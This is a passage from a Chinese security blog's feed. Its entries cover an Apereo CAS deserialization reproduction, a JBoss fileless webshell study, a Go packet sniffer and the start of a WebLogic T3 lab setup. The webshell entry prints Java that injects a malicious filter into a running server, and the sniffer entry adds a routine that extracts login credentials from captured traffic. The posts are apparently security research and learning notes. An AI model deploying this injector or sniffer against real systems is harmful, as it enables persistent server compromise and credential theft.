src="https://tva1.sinaimg.cn/large/008i3skNly1gucpry4kkxj61f80hcgp502.jpg" alt=""></p><p>跟入doDispatch进入如下函数org.springframework.web.servlet.DispatcherServlet#doDispatch，跟入handle函数，而handle 实际上是一个 Implement<br><img src="https://tva1.sinaimg.cn/large/008i3skNly1gucptm8ybsj61m40k0gpn02.jpg" alt=""></p><p>在org.springframework.webflow.mvc.servlet.FlowHandlerAdapter#handle函数中getFlowExecutionKey对request进行处理，获得Post包中的execution字段值<br><img src="https://tva1.sinaimg.cn/large/008i3skNly1gucpuphtaij61me0gkn4902.jpg" alt=""><br><img src="https://tva1.sinaimg.cn/large/008i3skNly1gucrzxxlgfj61e00bk76o02.jpg" alt=""><br>org.jasig.cas.web.flow.CasDefaultFlowUrlHandler#getFlowExecutionKey<br><img src="https://tva1.sinaimg.cn/large/008i3skNly1gucq22h37aj61dw0dkjuu02.jpg" alt=""><br>org.jasig.spring.webflow.plugin.ClientFlowExecutionRepository#parseFlowExecutionKey<br><img src="https://tva1.sinaimg.cn/large/008i3skNly1gucq68b5l4j61nk04ktaa02.jpg" alt=""><br>在org.jasig.spring.webflow.plugin.ClientFlowExecutionKey中对key值进行了切片，看见第一段是uid，第二段才是加密后的字节码，这里会比较数组长度是否为2，如果不为2则会抛出异常<br><img src="https://tva1.sinaimg.cn/large/008i3skNly1gucq7qwpixj61mk0lswk302.jpg" alt=""><br>下面则是对base64进行解密<br><img src="https://tva1.sinaimg.cn/large/008i3skNly1gucq8oswzcj61m404e75w02.jpg" alt=""><br>而反序列化的利用点则是在org.jasig.spring.webflow.plugin.ClientFlowExecutionRepository#getFlowExecution，首先先获取一个byte数组，随后传入到decode中<br><img src="https://tva1.sinaimg.cn/large/008i3skNly1gucqon7ln5j620i0k2n4i02.jpg" alt=""></p><p>而反序列化的过程以及在下图用箭头指出流程</p><p>org.jasig.spring.webflow.plugin.EncryptedTranscoder#decode<br><img src="https://tva1.sinaimg.cn/large/008i3skNly1gucqztelwcj62360kwwjp02.jpg" alt=""><br>再看一下加密算法，算法是 AES/CBC/PKCS7 ，KeyStore 是硬编码在 spring-webflow-client-repo-1.0.0.jar/etc/keystore.jcek<br><img src="https://tva1.sinaimg.cn/large/008i3skNly1gucsar95fej61gw09sgnv02.jpg" alt=""></p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>可以使用ysoserlia的cc链直接进行攻击，利用org.jasig.spring.webflow.plugin.EncryptedTranscoder.encode 进行加密即可，然后替换 execution 这个参数位置的值。记得要注意格式否则会报错。代码不贴出。</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gucsd2n5sfj624q0tkk8q02.jpg" alt=""></p><h3 id="回显"><a href="#回显" class="headerlink" title="回显"></a>回显</h3><p>而回显的问题在这篇<a href="http://www.00theway.org/2020/01/04/apereo-cas-rce/">文章</a>里面有提到</p><blockquote><p>org.springframework.webflow.context.ExternalContextHolder.getExternalContext()</p></blockquote><h2 id="代码编写"><a href="#代码编写" class="headerlink" title="代码编写"></a>代码编写</h2><p>这里用的是cc2的利用链，图上写的是cc6因为我写的cc6有点小问题，有段代码我之前改了，但是忘记放哪个地方了，然后就改用cc2了。需要注意的是这里的getPayload函数是之前返回PriorityQueue的实例，因为在encryptedTranscoder#encode中会进行一次writeObject所以直接返回queue就行了。<br><img src="https://tva1.sinaimg.cn/large/008i3skNly1gug959kthcj60wk0dy76n02.jpg" alt=""></p><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gug99436whj61b20na77402.jpg" alt=""></p><p>复现的时候也是没注意浪费了好多时间。</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gug9azw6m4j61b80u0tlh02.jpg" alt=""></p><h2 id="漏洞回显"><a href="#漏洞回显" class="headerlink" title="漏洞回显"></a>漏洞回显</h2><blockquote><p>org.springframework.webflow.context.ExternalContextHolder.getExternalContext()</p></blockquote><p>可以通过如上函数获取上下午，实现回显。我是直接写一个类写进了static中，直接触发。<br>也可以通过下面的函数触发恶意类的初始化，代码为就不粘贴了。</p><blockquote><p>org.springframework.cglib.core.ReflectUtils.defineClass().newInstance()<br><img src="https://tva1.sinaimg.cn/large/008i3skNly1guhdxkydinj61am0u0naw02.jpg" alt=""></p></blockquote><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="http://www.lmxspace.com/2020/03/09/Apereo-CAS-4-X%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/#Apereo-CAS-4-1-X-4-1-6-1">http://www.lmxspace.com/2020/03/09/Apereo-CAS-4-X%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/#Apereo-CAS-4-1-X-4-1-6-1</a></p>]]></content>
    
    <summary type="html">
    
      Apereo Cas 4.1.X 反序列化漏洞复现
    
    </summary>
    
    
      <category term="Java" scheme="http://yoursite.com/categories/Java/"/>
    
    
      <category term="Java" scheme="http://yoursite.com/tags/Java/"/>
    
      <category term="悦读" scheme="http://yoursite.com/tags/%E6%82%A6%E8%AF%BB/"/>
    
  </entry>
  
  <entry>
    <title>JBoss无文件webshell研究</title>
    <link href="http://yoursite.com/2021/08/26/JBoss%E6%97%A0%E6%96%87%E4%BB%B6webshell%E7%A0%94%E7%A9%B6/"/>
    <id>http://yoursite.com/2021/08/26/JBoss%E6%97%A0%E6%96%87%E4%BB%B6webshell%E7%A0%94%E7%A9%B6/</id>
    <published>2021-08-26T08:27:01.000Z</published>
    <updated>2021-08-26T08:28:18.120Z</updated>
    
    <content type="html"><![CDATA[<h1 id="JBoss无文件webshell研究"><a href="#JBoss无文件webshell研究" class="headerlink" title="JBoss无文件webshell研究"></a>JBoss无文件webshell研究</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在网上并没有怎么找到JBoss无文件shell的资料，只找到了宽字节的一篇，其中遇到了很多问题，不过还好自己也后来解决了，发现自己遇到了很多白痴问题，感觉自己好笨。。。</p><h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><ul><li>IDEA 2021.3</li><li>wildfly-20.0.0.Final</li></ul><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><h3 id="如何生成Filter"><a href="#如何生成Filter" class="headerlink" title="如何生成Filter"></a>如何生成Filter</h3><p>先在IDEA中部署一个JBoss项目，然后在Filter中先断点，同时使用debug启动，来观察一下。<br><img src="https://tva1.sinaimg.cn/large/008i3skNgy1gtu66mq5z2j61320hmmzz02.jpg" alt=""></p><p><img src="https://tva1.sinaimg.cn/large/008i3skNgy1gtu68yx6azj61oi0g8dl902.jpg" alt=""><br>我们可以看见有个MangerFilter#createFilter函数，我们跟进</p><pre><code class="java">public void createFilter() throws ServletException &#123;        synchronized(this) &#123;            if (this.filter == null) &#123;                try &#123;                    this.handle = this.filterInfo.getInstanceFactory().createInstance();                &#125; catch (Exception var4) &#123;                    throw UndertowServletMessages.MESSAGES.couldNotInstantiateComponent(this.filterInfo.getName(), var4);                &#125;                Filter filter = (Filter)this.handle.getInstance();                (new LifecyleInterceptorInvocation(this.servletContext.getDeployment().getDeploymentInfo().getLifecycleInterceptors(), this.filterInfo, filter, new FilterConfigImpl(this.filterInfo, this.servletContext))).proceed();                this.filter = filter;            &#125;        &#125;    &#125;</code></pre><p>在MangerFilter#createFilter中如果Filter不存在那么就会调用LifecyleInterceptorInvocation来生成filter，其中使用到了两个参数：this.servletContext，this.filterInfo，所以如果要通过反射生成Filter我们需要传入这两个参数<br><img src="https://tva1.sinaimg.cn/large/008i3skNly1gtu6wjia78j613e04ywf802.jpg" alt=""></p><h3 id="如何获取filterInfo和servletContext"><a href="#如何获取filterInfo和servletContext" class="headerlink" title="如何获取filterInfo和servletContext"></a>如何获取filterInfo和servletContext</h3><p>在MangerFilter中跟入filterInfo，观察filterInfo初始化需要name及filter的名称，然后一个filterClass<br><img src="https://tva1.sinaimg.cn/large/008i3skNly1gtu75wdkbhj61be0iuwjf02.jpg" alt=""><br>综上所述，我们需要通过反射的生成filterInfo的代码如下</p><pre><code class="java"> Object evilFilterInfo = Class.forName(&quot;io.undertow.servlet.api.FilterInfo&quot;).getDeclaredConstructors()[0].newInstance(&quot;FilterTest&quot;, evilFilterClass);</code></pre><p>对于其中的evilFilterClass又如何生成？我们只需要自己写一个Filter然后生成class文件，进行读取并进行base64加密即可,然后通过反射调用defineClass生成一个evilFilterClass</p><pre><code class="java">BASE64Decoder b64Decoder = new sun.misc.BASE64Decoder();String codeClass = &quot;yv66vgAA....&quot;;Method defineClassM = Thread.currentThread().getContextClassLoader().getClass().getSuperclass().getSuperclass().getSuperclass().getDeclaredMethod(&quot;defineClass&quot;, byte[].class, int.class, int.class);defineClassM.setAccessible(true);evilFilterClass = (Class) defineClassM.invoke(Thread.currentThread().getContextClassLoader(), b64Decoder.decodeBuffer(codeClass), 0, b64Decoder.decodeBuffer(codeClass).length);      </code></pre><p>而defineClass为什么这么写的原因只需要自己通过IDEA观察一下就可以明白<br><img src="https://tva1.sinaimg.cn/large/008i3skNgy1gtu7y8k6pbj617g0u0juk02.jpg" alt=""><br>而我们需要获取servletContext我们跟入<br><img src="https://tva1.sinaimg.cn/large/008i3skNgy1gtu8e96ocjj60ve0dkn1902.jpg" alt=""><br>然后查找哪些地方使用了ServletContext，在ServletRequest中调用到了，而对于<br><img src="https://tva1.sinaimg.cn/large/008i3skNgy1gtu8gm1jfkj614y0e8dj302.jpg" alt=""><br>现在很简单了，我们主要想办法获取ServletRequestContext就可以，而在其中存在getCurrentServlet的方法可以获取<br><img src="https://tva1.sinaimg.cn/large/008i3skNly1gtu8jjbwdqj61f80rkqav02.jpg" alt=""></p><p>现在步骤清晰了，这里已经可以生成一个Filter了接下来我们需要做的就是获取内存中的filters，然后加入其中</p><h3 id="将生成的filter加入到内存中"><a href="#将生成的filter加入到内存中" class="headerlink" title="将生成的filter加入到内存中"></a>将生成的filter加入到内存中</h3><p>很巧的是我们刚刚获取的currrentServlet，就是ServletChain<br><img src="https://tva1.sinaimg.cn/large/008i3skNly1gtu8rrgtagj617y0toaim02.jpg" alt=""><br><img src="https://tva1.sinaimg.cn/large/008i3skNly1gtu8s4sv18j61lo0dg78c02.jpg" alt=""><br>那么我们获取得到filters然后加入就完成了</p><pre><code class="java">Method getCurrentServletM = curContext.getClass().getMethod(&quot;getCurrentServlet&quot;);Object servletChain = getCurrentServletM.invoke(curContext);Field filtersF = servletChain.getClass().getDeclaredField(&quot;filters&quot;);filtersF.setAccessible(true);java.util.EnumMap filters = (EnumMap) filtersF.get(servletChain);ArrayList filterList = (ArrayList) filters.get(DispatcherType.REQUEST);filterList.add(evilManagedFilter);</code></pre><h2 id="解决问题"><a href="#解决问题" class="headerlink" title="解决问题"></a>解决问题</h2><h3 id="filterArrayList为null"><a href="#filterArrayList为null" class="headerlink" title="filterArrayList为null"></a>filterArrayList为null</h3><p>现在证实一下内存马是否成功，但是却失败了，报错显示的是空指针异常，<br><img src="https://tva1.sinaimg.cn/large/008i3skNly1gtu8ydp2m7j61400u0jy902.jpg" alt=""><br>但是为什么会报错，为也没想明白，就尝试看看各个阶段的一些关键参数的值<br><img src="https://tva1.sinaimg.cn/large/008i3skNly1gtu91q09z7j61gq0gq43m02.jpg" alt=""><br>可以看见filterList为null，<br>当时我对着屏幕发了好久的呆，然后后来突然想到了arraylist为null时不能成功的加入，因此进行尝试，这是因为在当前页面filter是空的，我们只要自己先把filter写进来就可以添加了<br><img src="https://tva1.sinaimg.cn/large/008i3skNly1gtu98c26icj61uu0d2whk02.jpg" alt=""><br>现在成功加入了</p><h2 id="验证"><a href="#验证" class="headerlink" title="验证"></a>验证</h2><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gtu9j19viij60u60u0gnq02.jpg" alt=""></p><p>完整代码：</p><pre><code>    Method currentM = null;        currentM = Class.forName(&quot;io.undertow.servlet.handlers.ServletRequestContext&quot;).getDeclaredMethod(&quot;current&quot;);        Object curContext = currentM.invoke(null);        Method getCurrentServletM = curContext.getClass().getMethod(&quot;getCurrentServlet&quot;);        Object servletChain = getCurrentServletM.invoke(curContext);        Field filtersF = servletChain.getClass().getDeclaredField(&quot;filters&quot;);        filtersF.setAccessible(true);        java.util.EnumMap filters = (EnumMap) filtersF.get(servletChain);        String evilFilterClassName = &quot;FilterTest&quot;;        Class evilFilterClass = null;        try &#123;            evilFilterClass = Class.forName(evilFilterClassName);        &#125; catch (ClassNotFoundException e) &#123;            BASE64Decoder b64Decoder = new sun.misc.BASE64Decoder();            String codeClass = &quot;yv66vgA&quot;; Method defineClassM = Thread.currentThread().getContextClassLoader().getClass().getSuperclass().getSuperclass().getSuperclass().getDeclaredMethod(&quot;defineClass&quot;, byte[].class, int.class, int.class);            defineClassM.setAccessible(true);            evilFilterClass = (Class) defineClassM.invoke(Thread.currentThread().getContextClassLoader(), b64Decoder.decodeBuffer(codeClass), 0, b64Decoder.decodeBuffer(codeClass).length);        &#125;        ArrayList filterList = (ArrayList) filters.get(DispatcherType.REQUEST);        Object evilFilterInfo = Class.forName(&quot;io.undertow.servlet.api.FilterInfo&quot;).getDeclaredConstructors()[0].newInstance(&quot;FilterTest&quot;, evilFilterClass);        Field servletRequestF = curContext.getClass().getDeclaredField(&quot;servletRequest&quot;);        servletRequestF.setAccessible(true);        Object obj = servletRequestF.get(curContext);        Field servletContextF = obj.getClass().getDeclaredField(&quot;servletContext&quot;);        servletContextF.setAccessible(true);        Object servletContext = servletContextF.get(obj);        Object evilManagedFilter = Class.forName(&quot;io.undertow.servlet.core.ManagedFilter&quot;).getDeclaredConstructors()[0].newInstance(evilFilterInfo, servletContext);        filterList.add(evilManagedFilter);</code></pre><p> ## 总结</p><p>其实这个代码还是有些问题，还没有解决。。。。。 </p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://www.cnblogs.com/potatsoSec/p/13168341.html">宽字节安全-JBoss无文件webshe<br>ll</a></p><p><a href="https://www.cnblogs.com/higgincui/p/5772514.html">多个Filter的执行顺序</a></p>]]></content>
    
    <summary type="html">
    
      JBoss无文件webshell研究
    
    </summary>
    
    
      <category term="Java" scheme="http://yoursite.com/categories/Java/"/>
    
    
      <category term="Java" scheme="http://yoursite.com/tags/Java/"/>
    
      <category term="悦读" scheme="http://yoursite.com/tags/%E6%82%A6%E8%AF%BB/"/>
    
  </entry>
  
  <entry>
    <title>Golang学习笔记 编写嗅探器</title>
    <link href="http://yoursite.com/2021/08/10/Golang%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%20%E7%BC%96%E5%86%99%E5%97%85%E6%8E%A2%E5%99%A8/"/>
    <id>http://yoursite.com/2021/08/10/Golang%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%20%E7%BC%96%E5%86%99%E5%97%85%E6%8E%A2%E5%99%A8/</id>
    <published>2021-08-10T09:14:01.000Z</published>
    <updated>2021-11-17T01:35:26.381Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Golang学习笔记-编写嗅探器"><a href="#Golang学习笔记-编写嗅探器" class="headerlink" title="Golang学习笔记 编写嗅探器"></a>Golang学习笔记 编写嗅探器</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>本文学习了《白帽子安全开发实战》</p><h2 id="工具准备"><a href="#工具准备" class="headerlink" title="工具准备"></a>工具准备</h2><ul><li>GoLand</li><li>go version go1.16 darwin/arm64</li><li>github.com/google/gopacket</li></ul><p>github.com/google/gopacket包的安装在其它平台上还需要安装其它东西，因为我使用的是macOS，已经默认安装了libpcap-dev，所以只需要在项目下执行如下命令即可。</p><blockquote><p>go mod init xxxx<br>go get github.com/google/gopacket</p></blockquote><h2 id="gopacket包示例"><a href="#gopacket包示例" class="headerlink" title="gopacket包示例"></a>gopacket包示例</h2><p>以下是gopacket包的示例，用来捕获数据包</p><pre><code class="go">import (    &quot;fmt&quot;    &quot;github.com/google/gopacket&quot;    &quot;github.com/google/gopacket/layers&quot;    &quot;github.com/google/gopacket/pcap&quot;    &quot;log&quot;    &quot;strings&quot;    &quot;time&quot;)var (    device = &quot;en0&quot;    snapshotLength int32 = 1024    promiscuous = false    timeout = 30 * time.Second    handle * pcap.Handle    err error)func main() &#123;    handle, err := pcap.OpenLive(device, snapshotLength, promiscuous, timeout)    if err != nil &#123;        log.Fatal(err)    &#125;    defer handle.Close()    packetSource := gopacket.NewPacketSource(handle, handle.LinkType())    for packet := range packetSource.Packets()&#123;        fmt.Println(packet.Dump())        fmt.Println(strings.Repeat(&quot;-&quot;,50))    &#125;&#125;</code></pre><p>代码很简单pcap.Openlive函数表示实时监听网卡的数据，其中的四个值表示的是网卡设备名，监听数据包大小，网卡是否为混杂模式，超时时间。同时需要使用root权限运行。运行后需要等待一段好司机，刚刚开始为没耐心，以为是自己写错了。</p><p>运行情况如下：<br><img src="https://tva1.sinaimg.cn/large/008i3skNly1gtbr8vinc1j61im0u044h02.jpg" alt=""></p><h2 id="协议分析程序的编写"><a href="#协议分析程序的编写" class="headerlink" title="协议分析程序的编写"></a>协议分析程序的编写</h2><h3 id="OSI模型"><a href="#OSI模型" class="headerlink" title="OSI模型"></a>OSI模型</h3><h4 id="第7层-应用层"><a href="#第7层-应用层" class="headerlink" title="第7层 应用层"></a>第7层 应用层</h4><p>应用层（Application Layer）提供为应用软件而设计的接口，以设置与另一应用软件之间的通信。例如：HTTP、HTTPS、FTP、Telnet、SSH、SMTP、POP3等。</p><h4 id="第6层-表示层"><a href="#第6层-表示层" class="headerlink" title="第6层 表示层"></a>第6层 表示层</h4><p>表示层（Presentation Layer）把数据转换为能与接收者的系统格式兼容并适合传输的格式。</p><h4 id="第5层-会话层"><a href="#第5层-会话层" class="headerlink" title="第5层 会话层"></a>第5层 会话层</h4><p>会话层（Session Layer）负责在数据传输中设置和维护计算机网络中两台计算机之间的通信连接。</p><h4 id="第4层-传输层"><a href="#第4层-传输层" class="headerlink" title="第4层 传输层"></a>第4层 传输层</h4><p>传输层（Transport Layer）把传输表头（TH）加至数据以形成数据包。传输表头包含了所使用的协议等发送信息。例如:传输控制协议（TCP）等。</p><h4 id="第3层-网络层"><a href="#第3层-网络层" class="headerlink" title="第3层 网络层"></a>第3层 网络层</h4><p>网络层（Network Layer）决定数据的路径选择和转寄，将网络表头（NH）加至数据包，以形成分组。网络表头包含了网络资料。例如:互联网协议（IP）等。</p><h4 id="第2层-数据链路层"><a href="#第2层-数据链路层" class="headerlink" title="第2层 数据链路层"></a>第2层 数据链路层</h4><p>数据链路层（Data Link Layer）负责网络寻址、错误侦测和改错。当表头和表尾被加至数据包时，会形成信息框（Data Frame）。数据链表头（DLH）是包含了物理地址和错误侦测及改错的方法。数据链表尾（DLT）是一串指示数据包末端的字符串。例如以太网、无线局域网（Wi-Fi）和通用分组无线服务（GPRS）等。</p><p>分为两个子层：逻辑链路控制（logical link control，LLC）子层和介质访问控制（Media access control，MAC）子层。</p><h4 id="第1层-物理层"><a href="#第1层-物理层" class="headerlink" title="第1层 物理层"></a>第1层 物理层</h4><p>物理层（Physical Layer）在局部局域网上发送数据帧（Data Frame），它负责管理电脑通信设备和网络媒体之间的互通。包括了针脚、电压、线缆规范、集线器、中继器、网卡、主机接口卡等。</p><h3 id="函数介绍"><a href="#函数介绍" class="headerlink" title="函数介绍"></a>函数介绍</h3><ul><li>Layers()[]Layer<blockquote><p>返回数据包中的所有层</p></blockquote></li><li>Layer(LayerType) Layer<blockquote><p>根据传入的类型返回一个Layer的接口，如果不存在该Layer则返回nil</p></blockquote></li><li>LayerClass(LayerClass) Layer<blockquote><p>根据传入的LayerClass返回数据包的第一层</p></blockquote></li><li>ApplicationLayer() <blockquote><p>返回数据包的第一个应用层</p></blockquote></li><li>ErrorLayer()<blockquote><p>用于判断前面的解析是否出错</p></blockquote></li></ul><p>那么如何对捕获到的数据包进行解析，虽然刚刚捕获到的已经很清晰，但是我们还能利用packet提供的接口进行更加直观的表示。例如：</p><pre><code class="go">ethernetLayer := packet.Layer(layers.LayerTypeEthernet)    if ethernetLayer != nil &#123;        ethernet := ethernetLayer.(*layers.Ethernet)        fmt.Printf(&quot;Ethernet type:%v source MAC:%v destination MAC:%v\n&quot;, ethernet.EthernetType, ethernet.SrcMAC, ethernet.DstMAC)    &#125;</code></pre><p>如上代码我们通过Layer函数返回了一个数据链路层的接口类型，我们将鼠标移到上面观看具体的数据类型，现在就很简单明了了。<br><img src="https://tva1.sinaimg.cn/large/008i3skNly1gtbrooiklkj61ig0m4wjd02.jpg" alt=""></p><p>诸如此类，我们在之前的代码上修改进行转换</p><pre><code class="go">package mainimport (    &quot;fmt&quot;    &quot;github.com/google/gopacket&quot;    &quot;github.com/google/gopacket/layers&quot;    &quot;github.com/google/gopacket/pcap&quot;    &quot;log&quot;    &quot;strings&quot;    &quot;time&quot;)var (    device = &quot;en0&quot;    snapshotLength int32 = 1024    promiscuous = false    timeout = 30 * time.Second    handle * pcap.Handle    err error)func main() &#123;    handle, err := pcap.OpenLive(device, snapshotLength, promiscuous, timeout)    if err != nil &#123;        log.Fatal(err)    &#125;    defer handle.Close()    packetSource := gopacket.NewPacketSource(handle, handle.LinkType())    for packet := range packetSource.Packets()&#123;        processPacket(packet)        //fmt.Println(packet.Dump())        fmt.Println(strings.Repeat(&quot;-&quot;,50))    &#125;&#125;func processPacket(packet gopacket.Packet) &#123;    allLayers := packet.Layers()    for _, layer := range allLayers&#123;        fmt.Printf(&quot;layer:%v\n&quot;,layer.LayerType())    &#125;    fmt.Println(strings.Repeat(&quot;-&quot;, 50))    ethernetLayer := packet.Layer(layers.LayerTypeEthernet)    if ethernetLayer != nil &#123;        ethernet := ethernetLayer.(*layers.Ethernet)        fmt.Printf(&quot;Ethernet type:%v source MAC:%v destination MAC:%v\n&quot;, ethernet.EthernetType, ethernet.SrcMAC, ethernet.DstMAC)    &#125;    ipLayer := packet.Layer(layers.LayerTypeIPv4)    if ipLayer != nil &#123;        ipv4 := ipLayer.(*layers.IPv4)        fmt.Printf(&quot;protocol:%v Src IP:%v Dst IP:%v\n&quot;, ipv4.Protocol, ipv4.SrcIP, ipv4.DstIP)    &#125;    tcpLayer := packet.Layer(layers.LayerTypeTCP)    if tcpLayer != nil &#123;        tcp := tcpLayer.(*layers.TCP)        fmt.Printf(&quot;source port:%v dest port:%v\n&quot;, tcp.SrcPort, tcp.DstPort)    &#125;    udpLayer := packet.Layer(layers.LayerTypeUDP)    if udpLayer != nil &#123;        udp := udpLayer.(*layers.UDP)        fmt.Printf(&quot;source port:%v dest port:%v\n&quot;, udp.SrcPort, udp.DstPort)    &#125;    applicationLayer := packet.ApplicationLayer()    if applicationLayer != nil &#123;        fmt.Printf(&quot;application payload:%v\n&quot;,string(applicationLayer.Payload()))    &#125;    err := packet.ErrorLayer()    if err != nil &#123;        fmt.Println(err)    &#125;&#125;</code></pre><p>代码运行：<br><img src="https://tva1.sinaimg.cn/large/008i3skNly1gtbr7m4lk4j61260u0adq02.jpg" alt=""></p><h3 id="密码监听功能的编写"><a href="#密码监听功能的编写" class="headerlink" title="密码监听功能的编写"></a>密码监听功能的编写</h3><p>如果要加入密码监听功能则需要引入filter</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gtbsmw42blj61dm0ecdhh02.jpg" alt=""></p><p>除了定义filter外还需要定义passList、userList</p><blockquote><p>userList = []string{“user”, “username”, “login”, “login_user”, “manager”, “user_name”, “usr”}</p></blockquote><blockquote><p>passList = []string{“pass”, “password”, “login_pass”, “pwd”, “passwd”}</p></blockquote><p>通过两个函数来判定数据包中是否存在用户名和密码</p><pre><code class="go">func checkPassword(payload []byte) (string, bool) &#123;    field := &quot;&quot;    result := false    for _,p := range passList &#123;        payload = []byte((strings.ToLower(string(payload))))        if bytes.Contains(payload, []byte(strings.ToLower(p)))&#123;            field = p            result = true            break        &#125;    &#125;    return field, result&#125;func checkUsername(payload []byte) (string, bool) &#123;    field := &quot;&quot;    result := false    for _,u := range userList &#123;        payload = []byte((strings.ToLower(string(payload))))        if bytes.Contains(payload,[]byte(strings.ToLower(u)))&#123;            field = u            result = true            break        &#125;    &#125;    return field,result</code></pre><p>最后完整代码如下：</p><pre><code class="go">func processPacket(packet gopacket.Packet) &#123;    var (        fromIp   string        destIp   string        srcPort  string        destPort string    )    ipLayer := packet.Layer(layers.LayerTypeIPv4)    if ipLayer != nil &#123;        ip, _ := ipLayer.(*layers.IPv4)        fromIp = ip.SrcIP.String()        destIp = ip.DstIP.String()    &#125;    tcpLayer := packet.Layer(layers.LayerTypeTCP)    if tcpLayer != nil &#123;        tcp, _ := tcpLayer.(*layers.TCP)        srcPort = tcp.SrcPort.String()        destPort = tcp.DstPort.String()    &#125;    applicationLayer := packet.ApplicationLayer()    if applicationLayer != nil &#123;        payload := applicationLayer.Payload()        if user, ok := checkUsername(payload); ok &#123;            _ = user            fmt.Printf(&quot;%v:%v-&gt;%v:%v, %v\n&quot;, fromIp, srcPort, destIp, destPort, string(payload))        &#125;        if pass, ok := checkPassword(payload); ok &#123;            _ = pass            fmt.Printf(&quot;%v:%v-&gt;%v:%v, %v\n&quot;, fromIp, srcPort, destIp, destPort, string(payload))        &#125;    &#125;&#125;</code></pre><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>如上仅仅只是个人学习笔记，没有代码编写的分析，因为也不是我写的，但是都有认真的自己敲一遍，去了解笔者的思路。</p>]]></content>
    
    <summary type="html">
    
      go
    
    </summary>
    
    
      <category term="go" scheme="http://yoursite.com/categories/go/"/>
    
    
      <category term="悦读" scheme="http://yoursite.com/tags/%E6%82%A6%E8%AF%BB/"/>
    
      <category term="go" scheme="http://yoursite.com/tags/go/"/>
    
  </entry>
  
  <entry>
    <title>Weblogic T3 反序列化学习</title>
    <link href="http://yoursite.com/2021/08/03/Weblogic%20T3%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/"/>
    <id>http://yoursite.com/2021/08/03/Weblogic%20T3%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/</id>
    <published>2021-08-03T02:40:01.000Z</published>
    <updated>2021-08-03T02:44:24.739Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Weblogic-T3-反序列化学习"><a href="#Weblogic-T3-反序列化学习" class="headerlink" title="Weblogic T3 反序列化学习"></a>Weblogic T3 反序列化学习</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近在公司实习也没有太多事情，就来学习一下Weblogic听好多师傅讲过很多次了。</p><p>这里我使用的是<a href="https://github.com/QAX-A-Team/WeblogicEnvironment">ATEAM大哥开源的搭建工具</a>，感谢前人提供的便捷。我这里本来打算在自己电脑上搭建，但是说多了都是泪，m1适配问题。。。。最后还是跑云服务器上进行了搭建。</p><h2 id="搭建过程"><a href="#搭建过程" class="headerlink" title="搭建过程"></a>搭建过程</h2><h3 id="下载文件"><a href="#下载文件" class="headerlink" title="下载文件"></a>下载文件</h3><p>先从GitHub上面拉取项目，拉取之后创建两个文件夹jdks,weblogics。<br><img src="https://tva1.sinaimg.cn/large/008i3skNly1gswpmihim7j31660l60wu.jpg" alt=""></p><ul><li>jdk下载地址： <a href="https://www.oracle.com/technetwork/java/javase/archive-139210.html">https://www.oracle.com/technetwork/java/javase/archive-139210.html</a></li><li>weblogic下载地址：<a href="https://www.oracle.com/technetwork/middleware/weblogic/downloads/wls-for-dev-1703574.html">https://www.oracle.com/technetwork/middleware/weblogic/downloads/wls-for-dev-1703574.html</a></li></ul><p>然后将文件夹放到云服务器上后。</p><h3 id="镜像搭建"><a href="#镜像搭建" class="headerlink" title="镜像搭建"></a>镜像搭建</h3><blockquote><p>sudo docker build –build-arg JDK_PKG=jdk-7u21-linux-x64.tar.gz –build-arg WEBLOGIC_JAR=wls1036_generic.jar  -t weblogic1036jdk7u21 .</p></blockquote><blockquote><p>docker run -d -p 7001:7001 -p 8453:8453 -p 5556:5556 –name weblogic1036jdk7u21 weblogic1036jdk7u21</p></blockquote><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gswpv8yayyj313m0q0n2c.jpg" alt=""></p><p>ps: 如果失败了就多输几次</p><blockquote><p>mkdir ./weblogic1036</p><p>docker cp weblogic1036jdk7u21:/u01/app/oracle/middleware/modules ./weblogic1036/</p><p>docker cp weblogic1036jdk7u21:/u01/app/oracle/middleware/wlserver ./weblogic1036</p><p>docker cp weblogic1036jdk7u21:/u01/app/oracle/middleware/coherence_3.7/lib ./weblogic1036/</p></blockquote><p>搭建完成访问：<a href="http://ip:7001/console/login">http://ip:7001/console/login</a></p><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gswqirgplgj31u20u0jv6.jpg" alt=""><br>落泪了QAQ</p><h3 id="远程调试"><a href="#远程调试" class="headerlink" title="远程调试"></a>远程调试</h3><p>然后将weblogic1036文件夹从服务器上拖回本地主机<br>使用IDEA打开weblogic1036文件夹下的wlserver<br><img src="https://tva1.sinaimg.cn/large/008i3skNly1gswq8gxqf5j30kc0g8jrz.jpg" alt=""><br>同时再将目录下的另外两个文件夹添加进Libraries中<br><img src="https://tva1.sinaimg.cn/large/008i3skNly1gswqas2xsmj311a0u076x.jpg" alt=""><br>最后server-&gt;lib-&gt;Add as Library<br><img src="https://tva1.sinaimg.cn/large/008i3skNly1gswqcc7tj0j30u0188wiv.jpg" alt=""><br>导入依赖后添加Remote JVM Debug 将Port设置成为8453.</p><p>PS：别忘记打开云服务器端口<br><img 